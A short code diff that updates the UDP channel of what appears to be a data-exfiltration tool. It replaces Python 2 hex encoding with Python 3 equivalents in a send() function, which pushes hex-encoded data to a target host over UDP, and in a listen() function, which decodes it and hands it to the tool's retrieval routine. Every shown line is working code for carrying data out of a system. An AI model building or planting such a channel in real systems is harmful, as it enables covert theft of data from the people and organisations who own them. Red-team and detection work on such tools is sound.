@@ -11,7 +11,8 @@ def send(data):
     app_exfiltrate.log_message(
         'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client_socket.sendto(data.encode('hex'), (target, port))
+    payload = (data.encode('utf-8') if isinstance(data, str) else data).hex()
+    client_socket.sendto(payload.encode('ascii'), (target, port))
 
 
 def listen():
@@ -39,8 +40,8 @@ def listen():
                     app_exfiltrate.log_message(
                         'info', "[udp] Received {} bytes".format(len(data)))
                     try:
-                        data = data.decode('hex')
-                        app_exfiltrate.retrieve_data(data)
+                        app_exfiltrate.retrieve_data(
+                            bytes.fromhex(data.decode('ascii')))
                     except Exception as e:
                         app_exfiltrate.log_message(
                             'warning', "[udp] Failed decoding message {}".format(e))
